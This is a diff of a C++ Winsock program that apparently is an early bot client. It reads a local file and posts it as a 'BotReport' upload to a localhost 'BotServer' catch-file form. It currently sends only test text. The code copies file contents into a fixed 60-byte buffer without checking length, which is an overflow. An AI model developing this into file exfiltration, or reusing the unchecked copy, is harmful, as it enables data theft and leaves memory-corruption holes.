@@ -3,6 +3,7 @@
 #include <iostream>
 #include <winsock.h>
 #include <fstream>
+#include <vector>
 
 using namespace std;
 #pragma comment(lib,"ws2_32.lib")
@@ -16,7 +17,7 @@ int main (){
 	if (ofs.good())   { // if opening is successful
 
 		
-			ofs << "ThisTextMustbeSend!";
+			ofs << "ThisTextMustbeSend plus this one !";
 
 		// close the file
 
@@ -27,7 +28,8 @@ int main (){
 		// otherwise print a message
 
 		cout << "ERROR: can't open file for writing." << endl;
-	
+
+
 	//Making socket for posting file :
 
 	WSADATA wsaData;
@@ -99,14 +101,65 @@ int main (){
 							"Referer: localhost/BotServer/index.php/bot_C/showcatchFileForm/\r\n"
 							"Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
 	
-	char sendStringP2 [] =  "Content-Length: 314";
+	
+	//char sendStringP2 [] =  "Content-Length: 314";
+
+	vector <char> sendBuffer;
+	char ch ='S';//Alaki!
+	ifstream ifs("new.txt",ifstream::in);
+	if (ifs.good())
+	{
+		while (!(ifs.eof()))
+		{
+			ch = (char) ifs.get( );
+			sendBuffer.push_back(ch);
+		}
+
+	}else {
+
+		cout << "Cannot read from file !";
+
+	}
 
 	
+
+	int fileSize = (int) sendBuffer.size();//this method print size + 1 because of null at the End . 
+
+	//cout<<endl<<fileSize<<endl;
+
+	char sendStringP2 [25];
+    
+	sprintf(sendStringP2 , "Content-Length: %d",fileSize/*-1*/+297);//For making suitable size we remove '-1' because /n !
+	
+
 	char sendStringP3 [] =	"\r\n\r\n-----------------------------41184676334\r\n"
 							"Content-Disposition: form-data; name='BotReport'; filename='test.txt'\r\n"
 							"Content-Type: text/plain\r\n\r\n";
+     
+	
+	char sendStringP4 [60] ={0};
 
-	char sendStringP4 [] =	"dsfsfsfsfsfsfsfsf";
+	
+
+
+
+	for (int i=0 ; i<=sendBuffer.size()-1;i++)
+	{
+		sendStringP4[i] = sendBuffer[i];
+	}
+
+
+
+	//cout<<endl<<sizeof(sendStringP4)<<endl;
+
+	//for (int i=0 ; i<=sizeof(sendStringP4);i++)
+	//{
+	//	cout<<" "<<sendStringP4[i]<<"-";
+	//}
+
+
+
+
 	
 	char sendStringP5 [] =	"\r\n-----------------------------41184676334"
 							"\r\nContent-Disposition: form-data; name='submit'"
@@ -118,7 +171,9 @@ int main (){
 	sprintf(sendString , "%s%s%s%s%s" , sendStringP1,sendStringP2,sendStringP3,sendStringP4,sendStringP5);
 
 
-	printf(sendString );
+	//printf(sendString );
+
+
 
 	send(Socket, sendString, strlen(sendString),0);
 	
